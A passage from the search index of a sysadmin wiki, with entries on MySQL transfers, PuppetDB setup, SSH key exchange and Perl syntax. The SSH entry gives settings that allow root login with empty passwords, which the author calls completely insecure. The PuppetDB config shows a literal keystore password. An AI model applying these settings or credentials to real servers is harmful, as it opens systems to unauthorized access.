$MYSQLSRV2 \"mysql -u$LOGIN -p$PASS $databases \u003c ~/tmp/baksql/$databases-`date +%y%m%d`.sql\" \u0026\u0026 baksql=$baksql`echo \"Reinjection of database $databases - OK ; \"` || baksql=$baksql`echo \"Reinjection of database $databases - FAILED ; \"` done # Delete temps ssh $MYSQLSRV2 rm -Rf /root/tmp/baksql ~/mysql_backup.tgz ~/tmp rm -Rf $TMPDIR # Send mail echo $baksql | mail -s \"Mysql transfers\" $ADMINMAIL Resources linkHow To Back Up MySQL Databases With mylvmbackup\n"
            }
        );
    index.add(
            {
                id:  203 ,
                href: "\/PuppetDB_:_Augmentez_les_fonctionnalit%C3%A9s_de_votre_Puppet\/",
                title: "PuppetDB: Enhance Your Puppet Functionality",
                description: "Learn how to install and configure PuppetDB to enhance Puppet functionality by collecting data and enabling exported resources.",
                content: " Software version 1.5.2 Operating System Debian 7 Website Puppet Website Last Update 28/10/2013 Introduction linkPuppetDB1 allows you to retrieve data collected by Puppet such as facts and to use exported resources among other things. This data can then be used by other programs, such as the dashboard, or your own tools through an API. You can install the PuppetDB server on your PuppetMaster or on a separate server.2\nToday it is possible to use 2 backends to store this data:\nHSQLDB: in-memory database, with quite a few limitations including the 100 nodes maximum, but extremely fast (as it’s loaded in RAM) PostgreSQL: classic database, with less performance (on disk), but with more flexibility and a greater possibility of extension over time (more than 100 Puppet nodes). We will proceed with the PostgreSQL-based solution.\nIf you want more information, check out the different bottlenecks. In summary: if you have more than 100 clients, you’ll need a PostgreSQL database, increase your JVM, and increase the number of CPUs/cores.\nInstallation linkPuppetDB linkLet’s start by setting up what we need to install PuppetDB:\nwget http://apt.puppetlabs.com/puppetlabs-release-stable.deb dpkg -i puppetlabs-release-stable.deb And then update:\naptitude update Then you need to have puppet installed on the same machine where PuppetDB will be installed.\nwarning PuppetDB cannot function without the puppet client! It doesn’t matter whether it’s the same machine as the master or not. For simplicity, we’ll install it on the Puppet Master.\naptitude install puppetdb puppet PostgreSQL linkSince we plan to have more than 100 clients (or even if it’s less, we don’t want to change the configuration in the future), we’ll install PostgreSQL:\naptitude install postgresql Terminus linkOn the Puppet Master server, install this package:\naptitude install puppetdb-terminus Configuration linkPostgreSQL linkWe’ll create a user and a database:\nsu - postgres createuser -DRSP puppetdb createdb -O puppetdb puppetdb exit PuppetDB linkFirst, configure the database information:\n[database] # For the embedded DB: org.hsqldb.jdbcDriver # For PostgreSQL: org.postgresql.Driver # Defaults to embedded DB classname = org.postgresql.Driver # For the embedded DB: hsqldb # For PostgreSQL: postgresql # Defaults to embedded DB subprotocol = postgresql # For the embedded DB: file:/path/to/database;hsqldb.tx=mvcc;sql.syntax_pgs=true # For PostgreSQL: //host:port/databaseName # Defaults to embedded DB located in /db subname = //localhost:5432/puppetdb # Connect as a specific user username = puppetdb # Use a specific password password = puppetdb # How often (in minutes) to compact the database # gc-interval = 60 # Number of seconds before any SQL query is considered 'slow'; offending # queries will not be interrupted, but will be logged at the WARN log level. log-slow-statements = 10 Here we define the database connection properties, as well as the credentials we created earlier.\nNow let’s configure the number of threads:\n# See README.md for more thorough explanations of each section and # option. [global] # Store mq/db data in a custom directory vardir = /var/lib/puppetdb # Use an external log4j config file logging-config = /etc/puppetdb/conf.d/../log4j.properties # Maximum number of results that a resource query may return resource-query-limit = 20000 [command-processing] # How many command-processing threads to use, defaults to (CPUs / 2) threads = 4 Adjust the number of threads to your processor count divided by 2.\nThen, we tackle the Jetty configuration:\n[jetty] # Hostname to list for clear-text HTTP. Default is localhost host = 0.0.0.0 # Port to listen on for clear-text HTTP. port = 8080 ssl-host = 0.0.0.0 ssl-port = 8081 keystore = /etc/puppetdb/ssl/keystore.jks truststore = /etc/puppetdb/ssl/truststore.jks key-password = CoaRwY6IL8KQd8H6SfZ7O9hHC trust-password = CoaRwY6IL8KQd8H6SfZ7O9hHC For the host, add the interface that will listen on ports 8080 and 8081. This notably allows the dashboard to connect to it.\nwarning If possible and as a security measure, leave everything on localhost. Obviously, Puppet Master must be on this same machine if host and host_ssl are set to localhost Then restart PuppetDB:\n/etc/init.d/puppetdb restart After a few seconds/minutes, you should be able to connect to port 8081 (ssl) or 8080 (non-ssl) (http://:8080|https://:8081), where you’ll have access to a nice interface:\nPuppet Master linkOn the master, you need to modify its configuration:\n[main] logdir=/var/log/puppet vardir=/var/lib/puppet ssldir=/var/lib/puppet/ssl rundir=/var/run/puppet factpath=$vardir/lib/facter templatedir=$confdir/templates pluginsync = true [master] # These are needed when the puppetmaster is run by passenger # and can safely be removed if webrick is used. ssl_client_header = SSL_CLIENT_S_DN ssl_client_verify_header = SSL_CLIENT_VERIFY storeconfigs = true storeconfigs_backend = puppetdb report = true [agent] server=puppet-prd.deimos.fr warning Remove the thin_storeconfigs and async_storeconfigs lines if you are using them, or set them to False Then we’ll set up a file for Puppet’s configuration to tell it how to connect to PuppetDB:\n[main] server = puppet-prd.deimos.fr port = 8081 And finally, a file to define the location of facts:\n--- master: facts: terminus: puppetdb cache: yaml That’s it, your Puppet server now has a working PuppetDB backend! :-)\nFAQ linkI have OutOfMemoryError errors in my logs and PuppetDB responds slowly linkTo confirm that the problem is indeed due to insufficient memory, check that the file /var/log/puppetdb/puppetdb-oom.hprof exists, and make sure the content mentions OOM.\nYou’ll need to increase the Java Heap size (Xmx value) of your PuppetDB which requires more RAM. Increase this value:\n########################################### # Init settings for puppetdb ########################################### # Location of your Java binary (version 6 or higher) JAVA_BIN=\"/usr/bin/java\" # Modify this if you'd like to change the memory allocation, enable JMX, etc JAVA_ARGS=\"-Xmx192m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/log/puppetdb/puppetdb-oom.hprof \" # These normally shouldn't need to be edited if using OS packages USER=\"puppetdb\" INSTALL_DIR=\"/usr/share/puppetdb\" CONFIG=\"/etc/puppetdb/conf.d\" For an idea of the value to set (where n represents the number of nodes):\n128M + (1M * n)\nReferences link http://docs.puppetlabs.com/puppetdb/1/index.html ↩︎\nhttp://binbash.fr/2012/11/14/puppet-3-et-puppetdb/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  204 ,
                href: "\/_Echange_de_clefs_SSH\/",
                title: "OpenSSH: SSH Key Exchange",
                description: "How to set up and use SSH key exchange for passwordless authentication, including basic and advanced configurations, ssh-add usage, and troubleshooting common issues.",
                content: "Introduction linkSSH key exchange is great for logging in without having to type your password. It’s also very simple to set up.\nBasic linkServer linkOn the server, the user account to which the client will connect (for example root) must have the .ssh directory present:\nmkdir .ssh Client linkOn the client, you need to generate a key pair, unless you already have one (~/.ssh/id_dsa.pub):\nssh-keygen -t rsa info For better security, encrypt your private key during creation by adding -p. If your keys are stolen, it won’t be as severe: ssh-keygen -t rsa -p Then, you need to send the key to the server:\ncat .ssh/id_rsa.pub | ssh **root**@**remote_host** \"cat \u003e\u003e .ssh/authorized_keys\" or\nssh-copy-id -i ~/.ssh/id_rsa.pub root@remote-server Now, if we connect to the server, we won’t be prompted for a password:\nssh **root**@**remote_host** Change ssh key passphrase linkYou can change your ssh passphrase:\nssh-keygen -f ~/.ssh/id_rsa -p Complex with restrictions linkIf, for example, you don’t want root to be accessible from anywhere, you need to perform a basic key exchange between the client machine and the server, then edit the following on the server:\nThe OpenSSH server configuration file /etc/ssh/sshd_config: PermitRootLogin without-password The authorized key file /root/.ssh/authorized_keys: from=\"10.0.0.1\" ssh-dss..... (the key in question) Finally, restart OpenSSH :). Now, only the machine at 10.0.0.1 will be authorized to connect directly as root and only via the key.\nIf you have multiple machines or hosts to add, separate them with commas.\nssh-add linkssh-add1 is a tool that allows you to have an SSH private key with a passphrase and not have to type it each time, but simply once during the first use. There is also an X counterpart called ssh-askpass. It’s also possible to define a timeout:\nssh-agent ssh-add -t 3600 So here, after an hour, you’ll need to enter the passphrase again.\nFAQ linkAuthentication refused: bad ownership or modes for directory linkIf you encounter this type of error:\nAuthentication refused: bad ownership or modes for directory /home/client Failed publickey for client from x.x.x.x port 57113 ssh2 Connection closed by x.x.x.x You have permission problems in your user’s home directory. Check that it has permissions like 755. If it’s not possible to change the permissions, then you need to tell SSH to be less restrictive about permissions. You need to modify the file /etc/ssh/sshd_config and add this option:\nStrictModes no Disabling protocol version 1. Could not load host key linkI had this small issue, particularly with the Xen Enterprise live CD for performing P2Vs. I wanted to connect remotely to check the progress of the migration. I needed to generate SSH keys to start the server. Here’s the procedure:\nssh-keygen -t rsa1 -f /etc/ssh_host_rsa_key -N \"\" ssh-keygen -t dsa -f /etc/ssh_host_dsa_key -N \"\" /usr/sbin/sshd And there you go, the problem of the server with missing keys is resolved :)\nI can’t change the root password and I absolutely want to connect to the machine linkBe careful with this technique because anyone will be able to connect. But for the more adventurous among you, modify these parameters:\nPermitRootLogin yes StrictModes no PermitEmptyPasswords yes Restart your SSH service, and there you go, your server is now completely insecure :)\nResources linkHow To Set Up SSH With Public-Key Authentication\nhttp://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch06_03.htm ↩︎\n"
            }
        );
    index.add(
            {
                id:  205 ,
                href: "\/Introduction_%C3%A0_Perl\/",
                title: "Introduction to Perl",
                description: "A comprehensive guide to Perl programming language covering basics, syntax, functions, modules, and advanced techniques",
                content: "Introduction linkThis documentation is intended for people with good knowledge of software development, as it simply provides notes on Perl syntax and how it works.\nPerl is a programming language created by Larry Wall in 1987, incorporating features from the C language and scripting languages like sed, awk, and shell.\nLarry Wall gives two interpretations of the “PERL” acronym:\nPractical Extraction and Report Language Pathetically Eclectic Rubbish Lister These names are retroactive acronyms.\nThe organization responsible for the development and promotion of Perl is The Perl Foundation. In France, “Les Mongueurs de Perl” promotes this language, notably through Perl Days events.\nBasics linkExponents:\n7.5e-24 # gives 7.5 times 10 to the power of -24 Simplified integer literal notation:\n123456789 # Can also be written as 123_45678_9 Here are the escape character sequences:\nConstruct Meaning \\n Newline \\r Return \\t Tab \\f FormFeed \\b Backspace \\a Bell \\e Escape (ASCII escape character) \\007 Any octal ASCII value (here, 007 = bell) \\x7F Any hex ASCII value (here, 7F = delete) \\cC A “control” character (here, Ctrl-C) \\ Backslash \" Double quote \\l Lowercase next letter \\L Lowercase all following letters until \\E \\u Uppercase next letter \\U Uppercase all following letters until \\E \\Q Quote non-word characters by adding a backslash until \\E \\E Terminate \\L, \\U, or \\Q String operators (concatenation):\n\"hello\" . \"world\" # equivalent to \"helloworld\" \"hello\" . ' ' . \"world\" # equivalent to 'hello world' 'hello world' . \"\\n\" # equivalent to \"helloworld\\n\" \"fred\" x 3 # equivalent to \"fredfredfred\" \"5 * 3\" # equivalent to 15 Be careful with string operators for numbers:\n\"5\" x 4 # equivalent to \"5555\" Binary assignment operator:\n$fred = $fred + 5 # Can be written as $fred += 5 Avoid:\nprint \"$fred\" -\u003e print $fred Operator precedence and associativity:\nAssociativity Operators left parentheses and arguments to list operators left -\u003e ++ – (autoincrement and autodecrement) right ** right \\ ! ~ + - (unary operators) left =~ !~ left * / % x left + - . (binary operators) left « » named unary operators (~X filetests, rand) \u003c \u003c= \u003e \u003e= lt le gt ge (the “unequal” ones) == != \u003c=\u003e eq ne cmp (the “equal” ones) left \u0026 left | ^ left \u0026\u0026 left || .. … right ? : (ternary) right = += -= *= etc. (and similar assignment operators) left , =\u003e list operators (rightward) right not left and left or xor Comparison operators:\nComparison Numeric String Equal == eq Not equal != ne Less than \u003c lt Greater than \u003e gt Less than or equal to \u003c= le Greater than or equal to \u003e= ge Loops linkIf linkHere is the structure of an if statement:\nif ($mytruc gt 'toto') { print \"'$mytruc' is greater than toto.\\n\"; } else { print \"'$mytruc' is less than toto.\\n\"; } To get STDIN as a scalar variable (Reminder: STDIN is used to capture what the user types on the keyboard):\n$line = ; if ($line eq \"\\n\") { print \"This was just an empty line!\\n\"; } else { print \"This input line was: $line\"; } while linkHere is the structure of a while loop:\n$total = 0; while ($total \u003c 10) { $total += 1; print \"total is now $total\\n\"; # gives values from 1 to 10 } Useful Functions linkDefined linkChecks if a value is defined or not\n$bre1 = ; if (defined($bre1) ) { print \"the input is $bre1\"; } else { print \"no input available!\\n\"; } Chomp linkRemoves newline characters:\n$text = \"a line of text\\n\"; chomp($text); Arrays linkHere’s how to set the 0th entry of an array:\n$tab[0] = \"test\"; And here’s how you can calculate an array index:\n$tab[5 - 0.4] = \"test\"; # This is $tab[4] To create 99 undefined elements:\n$tab[99] = \"test\"; To define the last element of the array, there are two methods:\n$tab[$#tab] = 'test'; $tab[-1] = 'test'; To know the number of columns in an array:\nmy $numbers = @tab; Now $numbers contains the number of columns.\nTo empty an array:\n@tab = (); Lists linkHere’s an example of lists:\n(1..5, 7) # from 1 to 5 and 7; qw linkIf for instance we want to have a list like this:\n(\"toto\", \"tata\", \"titi\") To simplify things, we can do this:\nqw/ toto tata titi / You can replace / with !, #, (), {}, [] or \u003c\u003e.\nThe advantage of using these notations is that malformed spaces or new lines will be automatically ignored, and your words will be taken into account. Here’s another possible form of writing:\nqw{ /usr/dict/words; /home/root/.ispell_french; } We can also do:\n@nombre = qw(un deux trois); List Assignments linkTo assign lists:\n($toto, $tata, $titi) = (\"un\", \"deux\", \"trois\"); Here toto equals un, tata equals deux…\nWe can swap this way:\n($toto, $tata) = ($tata, $toto); Be careful with ignored elements like:\n($toto, $tata) = qw; Here, only the first 2 will be considered. For the reverse:\n($toto, $tata) = qw; $tata will have an undef value.\npop linkPop is used to remove elements from the end of an array:\n@tab = 5..9 # my array goes from 5 to 9 $toto = pop(@tab); # $toto will receive 9, and the array will only have 5,6,7 and 8 $tata = pop @tab # same thing, so $tata gets 8 and the array stops at 7 pop @tab; # 7 is thrown away When the array is empty, pop returns undef.\npush linkPush is used to add values to the end of arrays:\npush (@tab, 0); # the array now contains 6, 7 and 0 push @tab, 1..10 # @tab now contains 10 more items shift linkShift is like pop but acts at the beginning of the array:\n@tab = qw; $myshift = shift @tab; # @tab now contains toto and titi. unshift linkUnshift is like push, but acts at the beginning of the array:\nunshift @tab, tata # Now my array is back to tata, toto, titi foreach linkA foreach will allow you to iterate through a complete list:\n@total = qw/toto titi tata/; foreach $toutou (@total) { print \"$toutou\\n\"; } $_ linkThis is probably the most used default variable in Perl. It allows you to not declare variables in a loop. For example:\nforeach (1..10) { # Default use of $_ print \"I can count to $_!\\n\"; } Another example:\n$_ = \"My test\\n\"; print; # prints the default variable $_ reverse linkReverse takes a list of values and returns the list in reverse order:\n@num = 6..10; @tab1 = reverse(@num); # returns 10,9,8,7,6. @tab2 = reverse 6..10; # Same but without fetching from the array. @num = reverse(@num); # Directly replaces in the original array. @inverse = reverse qw/ tata toto titi/; # gives tata titi toto $inverse = reverse qw/ tata toto titi/; # gives ototititatat sort linkLike the sort binary on Unix, it sorts alphabetically (but in ASCII order):\n@planetes = qw/ terre saturne mars pluton /; @triee = sort(@planetes); # gives mars, pluton, saturne and terre. @triee = sort @planetes; # Same @inverse = reverse sort(@planetes); # reverses the result above. List and Scalar Context linkIt’s important to understand this section:\n5 + x # x must be a scalar sort x # x must be a list @personnes = qw( toto tata titi); @triee = sort @personnes; $nombre = 5 + @personnes # gives 5 + 3 $n = @personnes; # gives 3 To force a scalar context:\nprint \"I \", scalar @tab, \" force the scalar\\n\"; Functions linkDefine with sub:\nsub way { $n += 1; print \"The subway number is: $n\\n\"; } And call the function with an ampersand (\u0026):\n\u0026way; # Will display: The subway number is: 1 \u0026way; # Will display: The subway number is: 2 Here’s an example:\nmy @c; sub liste_de_toto_a_titi { if ($toto \u003c $titi) { # Count up from toto to titi push @c, $toto..$titi; } else { # Count down from toto to titi push @c, $titi..$toto; } } $toto = 11; $titi = 6; @c = \u0026liste_de_toto_a_titi; # @c receives (11,10,9,8,7,6) print @c; Function Arguments linkLet’s pass 2 arguments to a function:\n$n = \u0026max(10,15); And in the function, we’ll call the 2 arguments with $[1] or $[2] (but only in the function!) which are part of the @_ list. These variables have nothing to do with the $_ variable. Here’s an example:\nsub max { if ($_[0] \u003c $_[1]) { $_[0]; } else { $_[1]; } } If a called value is not defined, it will be set to undef.\nTo ensure receiving the exact number of arguments:\nsub max { if (@_ != 2) { print \"Warning! \u0026max should receive 2 arguments\\n\"; } } my linkThe my value allows you to create private variables. Declared in a function, it will be called in the function and at the end, it will be removed from memory.\nsub max { my ($a, $b); # new private variables for this block ($a, $b) = @_; # give names to parameters if ($a \u003e $ b) { $a } else { $b } } We can simplify things:\nmy($a, $b) = @_; local linkLocal is the old name for my, except that local saves a copy of the variable’s value in a secret place (stack). This value cannot be consulted, modified, or deleted while it’s saved. Then local initializes the variable to an empty value (undef for scalars, or empty list for arrays), or the assigned value. When returning from the function, the variable is automatically restored to its original value. In short, the variable was borrowed for a time and returned before anyone noticed.\nYou cannot replace local with my in old Perl scripts, but remember to use my preferably when creating new scripts. Example:\nlocal($a, $b) = @_; return linkReturn will return the value of a function. For example, return, placed in a foreach will return a value when it has been found.\nuse strict linkTo write “clean” code, it’s better to put this in your scripts:\nuse strict; Hashes linkA hash table (or hash) is like an array except that instead of having numbers as references, we will have keys.\nIn case it’s not clear enough, here’s the difference:\nArray: Identifier or key (not modifiable) 0 1 2 Value (modifiable) tata titi toto Hash table: Identifier or key (modifiable) IP Machine Name Value (modifiable) 192.168.0.1 toto-portable Toto We declare a hash table this way:\n$my_hash_table{\"identifier\"} = \"value\"; To copy a column:\n$my_hash_table{\"identifier1\"} .= $my_hash_table{\"identifier2\"}; Perl decides the layout of keys in the hash table. You won’t have the possibility to organize them as you wish! This allows Perl to access information you’re looking for more quickly.\nList linkTo declare a hash list, we can do:\n%list_hash = (\"IP\", \"192.168.0.1\", \"Machine\", \"toto-portable\", \"Name\", \"Toto\"); There’s another way, much clearer, to make list declarations:\nmy %list_hash = ( \"IP\" =\u003e \"192.168.0.1\", \"Machine\" =\u003e \"toto-portable\", \"Name\" =\u003e \"Toto\", ); We can leave the comma on the last line without any problems. This can be convenient in some cases :-)\nreverse linkThe reverse on hash lists will prove very useful! Indeed, as you know, to perform searches, we can only take keys to find values. If we want to search in the reverse direction (values become keys, and keys become values):\n%list_hash_inversed = reverse %list_hash; But don’t think that this doesn’t take resources, because contrary to what one might think, a copy of a list does a complete unwinding, then a one-by-one copy of all elements. It’s exactly the same for a simple copy of a list:\n%hash1 = %hash2; Unfortunately, once again, this makes Perl work extremely hard! So if you have the possibility to avoid this kind of thing, that’s good :-)\nHash Functions linkKeys and values linkKeys and values are 2 hash functions that return only the keys or only the values:\n%list_hash = (\"IP\", \"192.168.0.1\", \"Machine\", \"toto-portable\", \"Name\", \"Toto\"); my @keys = keys %list_hash; my @values = values %list_hash; Here @keys will contain IP, Machine and Name, while @values will contain the rest.\nIn scalar form, this will give us the number of elements in keys and values! Note: If a value is empty, it will be considered false.\neach linkTo iterate through an entire hash, we’ll use each which returns a key/value pair in the form of a 2-element list:\nwhile ( ($key, $value) = each %hash ) { print \"$key =\u003e $value\\n\"; } exists linkTo know if a key exists in a hash:\nif (exists $name{\"192.168.0.1\"}) { print \"There is a name for the IP address 192.168.0.1!\\n\"; } delete linkThe delete function will delete the key in question:\nmy $dhcp{name}='toto'; delete $dhcp{$name}; Note: This is not equivalent to inserting undef into a hash element.\nReferences linkHere’s how to return hash references:\nsub foo { my %hash_ref; $hash_ref-\u003e{ 'key1' } = 'value1'; $hash_ref-\u003e{ 'key2' } = 'value2'; $hash_ref-\u003e{ 'key3' } = 'value3'; return $hash_ref; } my $hash_ref = foo(); print \"the keys: %$hash_ref\\n\"; Input/Output linkThe Diamond Operator linkThis operator allows you to merge multiple inputs into one large file:\nwhile (\u003c\u003e) { chomp; print \"This line comes from $_!\\n\" } This operator is generally used to process all input. Using it multiple times in a program would be an error.\n@ARGV link@ARGV is an array containing the calling arguments. The diamond operator will first read the @ARGV array; if the list is empty, it will read the standard input, otherwise the list of files it finds.\nStandard Output linkNormally, you understand that there are differences between displaying and interpolating:\nprint @tab; # displays a list of elements print \"@table\" # displays a string (containing an interpolated array) printf linkPrintf lets you better control the output. To display a number in a generally correct way, we will use %g, which automatically selects decimal, integer, or exponential notation:\nprintf \"%g %g\", 6/2, 51 ** 17; # This will give us 3 1.0683e+29 %d means a decimal integer:\nprintf \"%d times more\", 15.987690987; # Gives 15 times more Printf is often used to present data in columns. We’ll define spaces:\nprintf \"%6d\\n\", 32; # Gives \" 32\" Here we have 4 spaces then the number 32 which gives 6 characters.\nSame with %s which is dedicated to strings:\nprintf \"%10s\\n\", toto; # \" toto\" If we make the 10 negative, we’ll have left alignment:\nprintf \"%-10s\\n\", toto; # \"toto \" With numbers %f, it is able to truncate:\nprintf \"%12f\\n\", 6 * 7 + 2/3; # \" 42.666667\" printf \"%12.3f\\n\", 6 * 7 + 2/3; # \" 42.667\", here I told it to round to 3 digits after the decimal If we want the % sign to be mentioned then we need to have %%:\nprintf \"My percentage is %.2f%%\\n\"; 5.25/12; # result: \"0.44%\" In the case where we want to enter the value to truncate in STDIN, don’t forget to interpolate it:\nprintf \"%${value}s\\n\", $_ For more information: http://perldoc.perl.org/functions/sprintf.html\nRegex linkRegex or regular expressions are like another language to learn, which very easily provide access to very sophisticated tools.\nIf for instance we want to do a search and display the matching expression (equivalent to grep):\n$_ = \"tata titi toto\"; if (/tot/) { print \"Match found!\"; } Metacharacters linkMetacharacters are used to push searches even further. If I take the example above:\nif (/t.t/) { The character “.” means anything. So here, it matches tata, titi, and toto. If you really want to use “.” and not have it pass as regex, you need to use the metacharacter “\". Which gives “.”:\n3\\.15 # Gives 3.15 Quantifiers linkThe * sign means that the previous character is repeated x times or not at all:\n/toto\\t*titi/ # This search can have from 0 to x tabs between toto and titi If we want anything between toto and titi, just add a “.”:\n/toto.*titi/ # Will search for \"toto'anything'titi\" To repeat the previous element 1 or more times, use “+”:\n/toto +titi/ # Can give \"toto titi\" but not \"tototiti\" The ? indicates that it’s not mandatory:\n/toto-?titi/ # Gives tototiti or toto-titi Groupings linkWe can group with ():\n/toto+/ # Can make totooooooooo /(toto)+/ # Can give totototototototo Pipe linkThe pipe is used to designate one element or another:\n/toto|titi|tata/ # Will search for toto or titi or tata If one of them matches, it is taken. If we want to search for spaces or tabs:\n/( +|\\t+)/ Character Classes link To designate ranges or some letters or numbers, we’ll use []: [a-c] # Gives a,b and c [a-cw-z] # Gives a,b,c,w,x,y and z [1-6] # Gives 1 to 6 [a-zA-Z] # Alphabet in lowercase and uppercase To avoid certain characters, add ^:\n[^a-c] # Anything except a,b and c Now, even better! Some classes appear so often that they have been further simplified:\nOperator Description Example ^ Beginning of line ^Deimos for ‘Deimos Fr!!!’ $ End of line !$ for ‘Deimos Fr!!!’ . Any character d.im.s for ‘Deimos Fr!!!’ * Repetition of previous character from 0 to x times !* for ‘Deimos Fr !!!’ + Repetition of previous character from 1 to x times !+ for ‘Deimos Fr !!!’ ? Repetition of previous character from 0 to 1 time F? for ‘Deimos Fr!!!’ \\ Escape character . for ‘Deimos Fr.’ a,b,…z Specific character Deimos for ‘Deimos Fr’ \\w Alphanumeric character (a…z,A…Z,0…9) \\weimos for ‘Deimos Fr’ \\W Anything except an alphanumeric character I**\\Wll for ‘I’**ll be back’ \\d A digit \\d for 1 \\D Anything except a digit \\Deimos for Deimos \\s A spacing character such as: space, tab, carriage return, or line feed (\\f,\\t,\\r,\\n) ‘Deimos**\\s**Fr’ for ‘Deimos Fr’ \\S Anything except a spacing character ‘Deimos**\\S**Fr’ for ‘Deimos Fr’ {x} Repeats the previous character exactly x times !{3} in ‘Deimos Fr !!!’ {x,} Repeats the previous character at least x times !{2} in ‘Deimos Fr !!!’ {, x} Repeats between 0 and x times the previous character !{3} in ‘Deimos Fr !!!’ {x, y} Repeats between x and y times the previous character !{1, 3} in ‘Deimos Fr !!!’ [] Allows to put a range (from a to z[a-z], from 0 to 9[0-9]…) [A-D][0-5] in ‘A4’ [^] Allows to specify unwanted characters [^0-9]eimos in ‘Deimos’ () Allows to record the content of parentheses for later use (Deimos) in ‘Deimos Fr’ | Allows to make an exclusive or (Org|Fr|Com) in ‘Deimos Fr’ There’s a site that allows you to visualize a regex: Regexper (sources: https://github.com/javallone/regexper)\nSo:\n/toto \\w+ titi/ # Will give toto, space, any word, space and titi Isn’t that beautiful? To represent a space, we can also use \\s:\n/toto\\s\\w+\\stiti/ Now, if we want the opposites: [^\\d] # Anything except digits or we can use uppercase:\n\\D Pretty neat, right! :-)\nWe can also find [\\d\\D] which means any digit or non-digit (unlike the . which is identical except that the . doesn’t accept new lines).\nGeneral Quantifiers linkIf we want to match a pattern multiple times:\n/a{5,15}/ # \"a\" can be repeated between 5 and 15 times /a{3,}/ # \"a\" can be repeated from 3 to infinity Which can give for example, if we’re looking for an 8-character word:\n/\\w{8}/ Anchors linkAs there are too few characters, some are reused:\nSearches Anchors Beginning of a line /**^**My\\sstart/ End of a line /my\\send**$**/ Word Anchors linkTo define a whole word, we’ll use \\b:\n/\\btoto\\b/ # Will only search for \"toto\" To reverse the order of things, so if we want anything except toto:\n/\\Btoto\\B/ But we might want titine and titi:\n/\\btiti/ # Equivalent to titi.* Super-timorous, even stronger:\n/\\bsearch\\B/ # Will match searches, searching, and searched, but not search or research Memorization Parentheses linkA good example and we understand better. If we use:\n/./ # We locate any individual character except the new line To memorize this regex, we’ll use parentheses:\n/(.)/ # There's memorization here To reference it, we’ll use:\n/(.)\\1/ # This will contain the first regex memory This is not simple to understand but it will look for a character identical to the previous search\nFor example if we have HTML code:\nWe can make our search with this:\n// # the *\\1 indicates that we use the first memory of the regular expression. It is repeated when called (\\1). Given the complexity of the thing, I’ll try to show good examples. First of all, you need to count the opening parentheses, this will be our regex memory number (e.g.: ((… = 2, because 2 opening parentheses):\n/((toto|titi) (tata)) \\1/ # Can match toto tata toto tata or titi tata titi tata /((toto|titi) (tata)) \\2/ # Can match titi tata titi or toto tata toto /((toto|titi) (tata)) \\3/ # Can match toto tata tata or titi tata tata (even if this kind of expression is rare) /\\b((toto|titi)\\s+tata\\b\\b/ # Allows to search for exactly these words (and not totototo for example /^b[\\w.]{1,12}\\b$/ # Corresponds to strings of letters, never ending with a . and maximum 12 characters. Non-memorization Parentheses linkIf you want to use parentheses without them being stored in memory, you need to use these symbols “?:” like this:\nif (/(?:toto|tata) est en train de jouer/) { print \"Someone is playing\"; } Here, toto or tata won’t be stored.\nUsing Regex linkJust as we’ve seen with the qw// operator, it’s possible to do the same thing for matches with m//:\nm(toto) m m{tata} In short, the possibilities are ^,!(\u003c{[ ]}\u003e)!,^. The m// shortcut is not mandatory with the double //\nIgnoring Case linkTo ignore case, there’s /i:\n/toto\\n/i # The match can be toto or TOTO, or even ToTo...etc...:-) Ignoring Spaces and Comments linkIf you want to ignore all spaces and comments in your code, add /x:\n/ toto # \\n/x Matching Any Character linkThe fact that the . doesn’t match a new line character can be annoying. That’s why /s is useful. For example:\n$_ = \"Here:\\ntoto\\ntiti\\ntata.\\n\"; if (/\\btoto\\b.*\\btiti\\b/s) { print \"This string indicates toto after titi!\\n\" } We can even make combinations:\nif (/\\btoto\\b.*\\btiti\\b/si) { # Here we combine /s and /i Searching up to a Specific Character linkI struggled a lot with this regex before finding it. If for example, I have a line like:\nAnd I want to search for the content of name:\n/name=\"(.*)\"/ This regex won’t be enough because it will give me:\nCacti\" color=\"#8cb6ce\" meeting=\"false\" start=\"2010-04-26\" duration=\"65\" complete=\"0\" priority=\"1\" expand=\"true\"\u003e To fix the problem, here’s the solution:\n/name=\"(.*?)\"/ I simply put a ? which will ask to search not to the last “, but to the first one!\nThe =~ Binding Operator linkMatching with $_ is the default:\nmy $someone = \"The person in question is toto.\"; if ($someone =~ /\\btoto/) { print \"Now things get complicated\"; } If no binding operator is indicated, it will work with $_.\nHere’s another example of matching, but with regular expression memories:\n$me = \"For now I have lived 24 years!\"; if ($me =~/(\\d*) ans/) { print \"So I am $1 years old\\n\"; } One last one:\n$_ = \"toto tata, titi\"; if (/(\\S+) (\\S+), (\\S+)/) { print \"Here are the names: $1 $2 $3\"; } The memory remains intact until there is a match, whereas a successful match resets all of them. If you start playing too much with memories, you may have surprises. It is therefore advised to store them in variables:\nif {$toto =~ /(\\(w+)/) { my $search_toto = $1; } Now, watch out, we’ll see the kind of things that I find great with Perl:\nif (\"Here is toto, tata and titi\" =~ /,\\s(\\w+)/) { print \"The match is '$\u0026'.\\n\"; # That's \", tata\" } $\u0026: is the match $`: what is before the match $’: what is after the match\nIn conclusion, if we want the original string:\nprint \"The original string is: ($`)($\u0026)($').\\n\"; These “magic” variables have a price! They slow down subsequent regular expressions. This can make you lose a few milliseconds…minutes, depending on your program. Apparently, this problem is fixed in Perl 6.\nIf you have the possibility to use numbering instead of these regex, don’t hesitate!\nKnow that you can get even more info on regex here: http://www.perl.com/doc/manual/html/pod/perlre.html\nSubstitution linkFor substitution (replacement), we’ll use s///:\n$_ = \"Toto plays on the Wii with titi tonight\"; s/titi/tata/; # Replace titi with tata s/with (\\w+)/against $1/; # Replace \"with titi\" with \"against titi\" Or, more simply:\nmy $toto = 'TOTO'; my $titi = \"\\L$toto\"; print \"$titi\\n\"; Now, some slightly more complex examples:\n$_ = \"bumbo, small car\"; For a global substitution, that is, on all occurrences found, simply add “g”: $_ = \"bumbo, nice bumbo!\"; s/bumbo/auto/g; print \"$_\\n\"; It’s possible to use other delimiters (like for m and qw) such as “{}, [], \u003c\u003e, ##”:\ns\u003c^https://\u003e(http://); It’s also possible to combine “g” with another (like case sensitivity for example):\ns{https://}[http://]gi; To replace with uppercase, use \\U: s/(toto|titi)/\\U$1/gi; # Will give TOTO or TITI To replace with \\L for all lowercase: s/(toto|titi)/\\L$1/gi; # Will give toto or titi You can disable case modification with \\E: s/(\\w+) with (\\w+)/\\U$2\\E with $1/i; will give TOTO with titi Written in lowercase (\\l and \\u), these escapes only affect the following character: 